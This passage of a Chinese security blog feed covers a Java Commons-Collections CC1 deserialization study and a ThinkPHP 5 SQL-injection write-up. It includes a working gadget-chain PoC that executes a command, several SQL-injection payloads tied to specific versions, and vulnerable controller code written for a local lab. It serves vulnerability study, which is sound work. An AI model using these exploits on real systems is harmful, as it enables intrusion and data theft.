中需要注意的点</p><ol><li><code>Runtime</code>类是不能反序列化的，因为它没有扩展反序列化接口，所以需要使用反射来调用执行</li><li>需要注意构造 payload 时还需要注意 <code>inermap.put(&quot;value&quot;, &quot;lcdm123&quot;)</code></li><li>这个只对java的低版本（Java 8u71以前）适用，因为高版本对这个类的<code>readObject()</code>方法做了修改</li></ol><blockquote><p>具体的下面P神代码审计中都讲到了原因，所以就不重复记录浪费时间了</p></blockquote><p>但是在 ysoserial 中的链不是利用的 TransformedMap ，而是利用的 LazyMap，这是为什么呢？</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并且继承了 AbstractMapDecorator。</p><p>LazyMap 和 TransformedMap 的唯一差别就是，TransformedMap 是写入元素时执行 transform 而 LazyMap 是在使用 get 方法中执行 factory.transform。LazyMap 的作用就是懒加载，在 get 不到值的时候，它会调用 factory.transform 方法去获取一个值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107142042883.png" alt="image-20211107142042883"></p><p>同样是利用到了AnnotationInvocationHandler类，但是它的 readObject() 方法中没有利用到 get 方法，但是在它的 invoke 方法中调用了 get，所以在 ysoserial 中利用了对象代理的方法调用到 invoke。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107150456447.png" alt="image-20211107150456447"></p><p>动态代理之前的学习笔记：<a href="http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/">http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/</a></p><p>这里先写了一个 Map 的代理类，这个代理类实现的 invoke 方法中检测到如果调用 get 方法就会执行自定义的内容。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107154521318.png" alt="image-20211107154521318"></p><p>通过这样的方法就可以调用到 invoke 方法中的get()方法。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107155236632.png" alt="image-20211107155236632"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br><br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inermap, transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, outermap);<br><br>        Map proxymap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,<br>                handler);<br>        handler = (InvocationHandler) cons.newInstance(Retention.class, proxymap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream =  <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个POC和上面的差比不大，只是改动了一些地方，并且使用了 java 的代理机制触发了整条链子</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107163204792.png" alt="image-20211107163204792"></p><p>这里的重点还是对于 java 代理机制的熟练理解与使用</p><p>参考文章</p><p><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/117279811">https://y4tacker.blog.csdn.net/article/details/117279811</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119701408">https://ego00.blog.csdn.net/article/details/119701408</a></p><p>p神代码审计</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC1&quot;&gt;&lt;a href=&quot;#CC1&quot; class=&quot;headerlink&quot; title=&quot;CC1&quot;&gt;&lt;/a&gt;CC1&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Tp5 SQL注入</title>
    <link href="http://example.com/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-30T17:37:01.000Z</published>
    <updated>2021-10-30T17:38:04.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5"><a href="#ThinkPHP-5" class="headerlink" title="ThinkPHP 5"></a>ThinkPHP 5</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 5.0.24</p></blockquote><p>thinkphp5 与 thinkphp3 的区别</p><p><a href="https://cloud.tencent.com/developer/article/1135144">https://cloud.tencent.com/developer/article/1135144</a> </p><p><a href="https://blog.csdn.net/m0_37836194/article/details/89517379">https://blog.csdn.net/m0_37836194/article/details/89517379</a></p><p>目录结构</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png" alt="image-20211001220058899"></p><p>程序的入口文件是在 <code>public/index.php</code> 然后加载 <code>thinkphp/start.php</code> 在 <code>thinkphp/base.php</code> 中定义了一些常量，做好准备工作后就会执行 <code>App::run()-&gt;send()</code> 启动框架</p><p>路由逻辑</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211002184117887.png" alt="image-20211002184117887"></p><blockquote><p>还存在一些其他的路由方法</p><p><a href="http://127.0.0.1/public/index.php/index/index/index2">http://127.0.0.1/public/index.php/index/index/index2</a></p></blockquote><p>大致的源码阅读已经有大佬写了文章，这里我就不再写了，直接看就好了</p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><h4 id="SQL1（insert）"><a href="#SQL1（insert）" class="headerlink" title="SQL1（insert）"></a>SQL1（insert）</h4><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.015 5.1.0&lt;=ThinkPHP&lt;=5.15</strong></p><p>环境的安装利用<code>composer</code></p><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// application/index/controller/Index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;insert(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;$username);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create database tpdemo;<br>use tpdemo;<br>create table users(<br>id int primary key auto_increment,<br>username varchar(50) not null<br>);<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p><code>insert()</code>注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>: /public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=inc&amp;username[<span class="hljs-number">1</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028232421470.png" alt="image-20211028232421470"></p><blockquote><p>需要再配置文件中开启调试功能，才会有报错回显</p></blockquote><p><strong>漏洞分析</strong></p><blockquote><p>漏洞分析的技巧可以对比官方更新文档来推测出漏洞点的位置</p></blockquote><p>直接寻找到 <code>insert()</code> 函数，<code>$username</code> 就是传入 <code>$data</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029000949504.png" alt="image-20211029000949504"></p><p><code>$data</code>是数组，所以执行后面的判断，这里的<code>inc</code> 和<code>dec</code> 都可以拿来注入，<code>exp</code>不行因为官方之前就有过滤了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029001626730.png" alt="image-20211029001626730"></p><p>这里的过滤把传入的一写危险单词给过滤了</p><p><img src="D:\markdown\image-20211029002700010.png" alt="image-20211029002700010"></p><p>最后将处理后的参数直接加入SQL语句这样就造成了注入</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51">https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51</a></p><h4 id="SQL2（update）"><a href="#SQL2（update）" class="headerlink" title="SQL2（update）"></a>SQL2（update）</h4><p><strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.* <span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure><p>修改<code>composer.json</code> 文件中 ThinkPHP 的版本然后执行<code>composer update</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029163300310.png" alt="image-20211029163300310"></p><p>添加入口代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164350160.png" alt="image-20211029164350160"></p><p>开启debug模式不然报错注入没有回显，并且配置好框架数据库信息</p><p><strong>漏洞复现</strong></p><p>payload:<code>http://127.0.0.1/public/index.php/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&amp;username[3]=1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164304431.png" alt="image-20211029164304431"></p><p><strong>漏洞分析</strong></p><p>直接根据 payload 来查看漏洞点，也可以查看官方的更新记录根据前后对比来发掘漏洞点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029170335139.png" alt="image-20211029170335139"></p><p>最终的 <code>update()</code> 函数是在<code>builder.php</code>中构建的 SQL 语句</p><p>最后的漏洞出现在<code>parseArrayData()</code>函数这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171046857.png" alt="image-20211029171046857"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171704358.png" alt="image-20211029171704358"></p><p>这个函数的<code>list()</code>函数反向赋值有点没有看懂？？？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029172740053.png" alt="image-20211029172740053"></p><p>这里把传入的参数进行了拼接然后插入进了 SQL 语句中，并且没有经过任何过滤措施，就造成了SQL注入漏洞</p><h4 id="SQL3（select）"><a href="#SQL3（select）" class="headerlink" title="SQL3（select）"></a>SQL3（select）</h4><p>影响范围：ThinkPHP 全版本</p><p><strong>环境搭建</strong></p><p>直接利用上一个环境即可</p><p>入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,$username)-&gt;select();<br>        <span class="hljs-keyword">return</span> $result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)--+</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029182836622.png" alt="image-20211029182836622"></p><p><strong>漏洞分析</strong></p><p>调试的时候直接在<code>Builder</code> 类<code>select()</code>处下断点，因为主要是在这里生成 SQL 语句</p><p>从 <code>select()</code> 中的 <code>parseWhere()</code> 到 <code>buildWhere()</code> 然后到 <code>parseWhereItem()</code> </p><p><code>parseWhereItem()</code>中是漏洞的主要点（记得好像 TP3 也有类似），获取到值输入的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029195319761.png" alt="image-20211029195319761"></p><p>这里循环检测<code>$exp</code>是否在<code>$parser</code>数组中，如果存在就进入执行拼接语句并且返回（未做任何过滤）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029194524372.png" alt="image-20211029194524372"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029193916454.png" alt="image-20211029193916454"></p><p>最后构成SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029200920783.png" alt="image-20211029200920783"></p><blockquote><p>分析得比较简略</p></blockquote><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81</a></p><h4 id="SQL4"><a href="#SQL4" class="headerlink" title="SQL4"></a>SQL4</h4><p>漏洞影响：<code>ThinkPHP=5.0.10</code></p><p><strong>环境搭建</strong></p><p><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();<br>        var_dump($result);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()--+ </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029204945485.png" alt="image-20211029204945485"></p><p><strong>漏洞分析</strong></p><p>当数据传输给服务器时，不管使用哪种方法在 <code>ThinkPHP</code> 中都会经过 <code>Request</code> 类的 <code>input</code> 方法，这些数据都会被强制类型转换，并且经过 <code>filterValue</code> 方法的处理</p><p>注意这里的过滤虽然包含了 NOTLIKE 但是这里中间没有空格</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030001513315.png" alt="image-20211030001513315"></p><p>动态调试一下</p><p>这里直接跳过了，没有被过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030002532518.png" alt="image-20211030002532518"></p><p>之后的参数拼接，主要就是在<code>parseWhereItem()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030003754664.png" alt="image-20211030003754664"></p><p>这里就是利用payload中username需要传入二维数组的原因</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030004242391.png" alt="image-20211030004242391"></p><p>最后执行下来就会造成SQL注入了</p><p>这个漏洞只在 ThinkPHP 5.0.10中出现是因为之前的版本中默认不允许出现 not like。</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/</a></p><h4 id="SQL5-（order）"><a href="#SQL5-（order）" class="headerlink" title="SQL5 （order）"></a>SQL5 （order）</h4><p>影响版本：<code>5.1.16&lt;=ThinkPHP&lt;=5.1.22</code></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5.</span>1.<span class="hljs-string">22</span><br></code></pre></td></tr></table></figure><p>然后修改<code>compose.json</code>更新一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $orderby = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>])-&gt;order($orderby)-&gt;find();<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>需注意的是 php 的版本问题</p></blockquote><p><strong>漏洞复现</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030201755912.png" alt="image-20211030201755912"></p><p><strong>漏洞分析</strong></p><blockquote><p>这个 payload 有点奇怪没有见过，是在键中的</p></blockquote><p>这个漏洞主要是由 <code>order</code> 引起的</p><p>传入的值会经过<code>Request</code>类中的<code>input()</code>函数，之后就会经过过滤函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211107424.png" alt="image-20211030211107424"></p><p>这里经过递归过滤但是这里的特殊的地方就是 payload 在键中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211648109.png" alt="image-20211030211648109"></p><p>之后就进入查询，因为知道是 order 注入，所以这里直接跟进相关函数，调试时更进到 <code>parseOrder()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030223027240.png" alt="image-20211030223027240"></p><p>上面的<code>parseKey（）</code>使用给<code>$key</code>前后添加了反引号</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030224610437.png" alt="image-20211030224610437"></p><p>最后被拼接到了SQL语句中，造成了SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030234224569.png" alt="image-20211030234224569"></p><p>官方的修复方法是对变量就行了检查，判断是否存在<code>)</code> <code>#</code></p><p>参考文章</p><p><a href="https://blog.csdn.net/lyj20010728/article/details/119685805">https://blog.csdn.net/lyj20010728/article/details/119685805</a></p><p><a href="https://www.codetd.com/article/13124414">https://www.codetd.com/article/13124414</a></p><p><a href="https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><h4 id="SQL6"><a href="#SQL6" class="headerlink" title="SQL6"></a>SQL6</h4><p>影响版本</p><p><code>5.0.0&lt;=ThinkPHP&lt;=5.0.21</code></p><p><code>5.1.3&lt;=ThinkPHP&lt;=5.1.25</code></p><p><strong>环境配置</strong></p><p>还是利用上面的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $options = request()-&gt;get(<span class="hljs-string">&#x27;options&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;max($options);<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要开启 app_debug 和 app_trace</p><p><strong>漏洞复现</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/public/index.php/index/index/index?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031000952539.png" alt="image-20211031000952539"></p><p><img 